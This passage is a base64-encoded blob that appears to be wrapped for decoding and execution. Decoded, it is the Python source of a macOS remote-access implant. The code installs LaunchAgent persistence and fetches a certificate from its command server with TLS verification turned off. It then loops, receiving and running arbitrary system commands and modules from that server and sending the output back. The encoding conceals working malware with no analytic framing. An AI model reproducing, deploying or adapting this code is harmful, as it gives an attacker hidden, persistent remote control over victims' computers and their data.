ZW50LiIiIgogICAgcmV0dXJuIGdldF9sYXVuY2hfYWdlbnRfZGlyZWN0b3J5KCkgKyAiLyVzLnBsaXN0IiAlIExBVU5DSF9BR0VOVF9OQU1FCgoKZGVmIGdldF9jYV9maWxlKCk6CiAgICAiIiI6cmV0dXJuIFRoZSBwYXRoIHRvIHRoZSBzZXJ2ZXIgY2VydGlmaWNhdGUgYXV0aG9yaXR5IGZpbGUuIiIiCiAgICBjYV9maWxlID0gZ2V0X3Byb2dyYW1fZGlyZWN0b3J5KCkgKyAiL3NlcnZlci5jZXJ0IgoKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhjYV9maWxlKToKICAgICAgICAjIElnbm9yZSB0aGUgQ0Egb25seSBmb3IgdGhpcyByZXF1ZXN0IQogICAgICAgIHJlcXVlc3RfY29udGV4dCA9IHNzbC5jcmVhdGVfZGVmYXVsdF9jb250ZXh0KCkKICAgICAgICByZXF1ZXN0X2NvbnRleHQuY2hlY2tfaG9zdG5hbWUgPSBGYWxzZQogICAgICAgIHJlcXVlc3RfY29udGV4dC52ZXJpZnlfbW9kZSA9IHNzbC5DRVJUX05PTkUKCiAgICAgICAgcmVxdWVzdCA9IHVybGxpYjIuUmVxdWVzdCh1cmw9Imh0dHBzOi8vJXM6JXMvYXBpL2dldF9jYSIgJSAoU0VSVkVSX0hPU1QsIFNFUlZFUl9QT1JUKSkKICAgICAgICByZXNwb25zZSA9IHVybGxpYjIudXJsb3BlbihyZXF1ZXN0LCBjb250ZXh0PXJlcXVlc3RfY29udGV4dCkKCiAgICAgICAgd2l0aCBvcGVuKGNhX2ZpbGUsICJ3IikgYXMgaW5wdXRfZmlsZToKICAgICAgICAgICAgaW5wdXRfZmlsZS53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKHN0cihyZXNwb25zZS5yZWFkbGluZSgpKSkpCiAgICAgICAgcmV0dXJuIGNhX2ZpbGUKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIGNhX2ZpbGUKCgpkZWYgbWFpbigpOgogICAgIiIiTWFpbiBwcm9ncmFtIGxvb3AuIiIiCiAgICBsYXN0X2FjdGl2ZSA9IHRpbWUudGltZSgpICAjIFRoZSBsYXN0IHRpbWUgYSBjb21tYW5kIHdhcyByZXF1ZXN0ZWQgZnJvbSB0aGUgc2VydmVyLgogICAgaWRsZSA9IEZhbHNlCiAgICB0YXNrcyA9IFtdICAjIExpc3Qgb2YgdHVwbGVzIGNvbnRhaW5pbmcgdGhlIHRhc2sgbmFtZSBhbmQgdGhyZWFkLgoKICAgIGlmIG9zLnBhdGguZGlybmFtZShvcy5wYXRoLnJlYWxwYXRoKF9fZmlsZV9fKSkubG93ZXIoKSAhPSBnZXRfcHJvZ3JhbV9kaXJlY3RvcnkoKS5sb3dlcigpOgogICAgICAgIGlmIG5vdCBERVZFTE9QTUVOVDoKICAgICAgICAgICAgIyBTZXR1cCBwZXJzaXN0ZW5jZS4KICAgICAgICAgICAgc2V0dXBfcGVyc2lzdGVuY2UoKQoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBsb2cuaW5mbygiUmVjZWl2aW5nIGNvbW1hbmQuLi4iKQogICAgICAgICAgICBjb21tYW5kID0gcmVjZWl2ZV9jb21tYW5kKCkKCiAgICAgICAgICAgIGlmIGNvbW1hbmQ6CiAgICAgICAgICAgICAgICBpZiBpZGxlOgogICAgICAgICAgICAgICAgICAgIGxvZy5pbmZvKCJTd2l0Y2hpbmcgZnJvbSBpZGxlIGJhY2sgdG8gbm9ybWFsIG1vZGUuLi4iKQoKICAgICAgICAgICAgICAgIGxhc3RfYWN0aXZlID0gdGltZS50aW1lKCkKICAgICAgICAgICAgICAgIGlkbGUgPSBGYWxzZQoKICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQubW9kdWxlX25hbWU6CiAgICAgICAgICAgICAgICAgICAgIyBSdW4gYSBtb2R1bGUuCiAgICAgICAgICAgICAgICAgICAgbG9nLmluZm8oIlJ1bm5pbmcgbW9kdWxlOiAlcyIsIGNvbW1hbmQubW9kdWxlX25hbWUpCgogICAgICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQuY29tbWFuZC5zdGFydHN3aXRoKCJraWxsX3Rhc2siKToKICAgICAgICAgICAgICAgICAgICAgICAgbG9nLmluZm8oIkF0dGVtcHRpbmcgdG8ga2lsbCB0YXNrIFwiJXNcIi4uLiIgJSBjb21tYW5kLm1vZHVsZV9uYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBmb3VuZF90YXNrID0gRmFsc2UKCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0YXNrIGluIHRhc2tzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19uYW1lLCB0YXNrX3RocmVhZCA9IHRhc2sKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXNrX25hbWUgIT0gY29tbWFuZC5tb2R1bGVfbmFtZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3VuZF90YXNrID0gVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfdGhyZWFkLmtpbGwoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tzLnJlbW92ZSh0YXNrKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2cuaW5mbygiVGFzayBzdG9wcGVkLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9yZXNwb25zZSgiVGFzayBzdG9wcGVkLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBmb3VuZF90YXNrOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nLmluZm8oIkZhaWxlZCB0byBmaW5kIHJ1bm5pbmcgdGFzay4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9yZXNwb25zZSgiRmFpbGVkIHRvIGZpbmQgcnVubmluZyB0YXNrLiIpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjb21tYW5kLmlzX3Rhc2s6CiAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5pbmZvKCJUaGlzIG1vZHVsZSBpcyBhIHRhc2ssIHJ1bm5pbmcgaW4gc2VwYXJhdGUgdGhyZWFkLi4uIikKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfdGhyZWFkID0gS2lsbGFibGVUaHJlYWQodGFyZ2V0PXJ1bl9tb2R1bGUsIGFyZ3M9KGNvbW1hbmQuY29tbWFuZCwpKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrX3RocmVhZC5kYWVtb24gPSBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfdGhyZWFkLnN0YXJ0KCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tzLmFwcGVuZCgoY29tbWFuZC5tb2R1bGVfbmFtZSwgdGFza190aHJlYWQpKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfcmVzcG9uc2UocnVuX21vZHVsZShjb21tYW5kLmNvbW1hbmQpLCBjb21tYW5kLm1vZHVsZV9uYW1lKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAjIFJ1biBhIHN5c3RlbSBjb21tYW5kLgogICAgICAgICAgICAgICAgICAgIGxvZy5pbmZvKCJSdW5uaW5nIGNvbW1hbmQ6ICVzIiwgY29tbWFuZC5jb21tYW5kKQoKICAgICAgICAgICAgICAgICAgICBzZW5kX3Jlc3BvbnNlKHJ1bl9jb21tYW5kKGNvbW1hbmQuY29tbWFuZCwgY2xlYW51cD1GYWxzZSkpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBsb2cuaW5mbygiTm8gY29tbWFuZCByZWNlaXZlZC4iKQoKICAgICAgICAgICAgICAgIGlmIGlkbGU6CiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgzMCkKICAgICAgICAgICAgICAgIGVsaWYgKHRpbWUudGltZSgpIC0gbGFzdF9hY3RpdmUpID4gSURMRV9USU1FOgogICAgICAgICAgICAgICAgICAgIGxvZy5pbmZvKCJUaGUgbGFzdCBjb21tYW5kIHdhcyBhIHdoaWxlIGFnbywgc3dpdGNoaW5nIHRvIGlkbGUuLi4iKQogICAgICAgICAgICAgICAgICAgIGlkbGUgPSBUcnVlCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoQ09NTUFORF9JTlRFUlZBTCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4OgogICAgICAgICAgICBpZiAiQ29ubmVjdGlvbiByZWZ1c2VkIiBpbiBzdHIoZXgpOgogICAgICAgICAgICAgICAgIyBUaGUgc2VydmVyIGlzIG9mZmxpbmUuCiAgICAgICAgICAgICAgICBsb2cud2FybigiRmFpbGVkIHRvIGNvbm5lY3QgdG8gdGhlIHNlcnZlci4iKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCg1KQogICAgICAgICAgICBlbGlmICJjZXJ0aWZpY2F0ZSIgaW4gc3RyKGV4KToKICAgICAgICAgICAgICAgICMgSW52YWxpZCBjZXJ0aWZpY2F0ZSBhdXRob3JpdHkuCiAgICAgICAgICAgICAgICBsb2cuZXJyb3IoIkVycm9yOiAlcyIsIHN0cihleCkpCiAgICAgICAgICAgICAgICBsb2cuZXJyb3IoIkludmFsaWQgY2VydGlmaWNhdGUgYXV0aG9yaXR5LCByZW1vdmluZy4uLiIpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZ2V0X3Byb2dyYW1fZGlyZWN0b3J5KCkgKyAiL3NlcnZlci5jZXJ0IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGxvZy5lcnJvcih0cmFjZWJhY2suZm9ybWF0X2V4YygpKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCg1KQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBtYWluKCkK'))
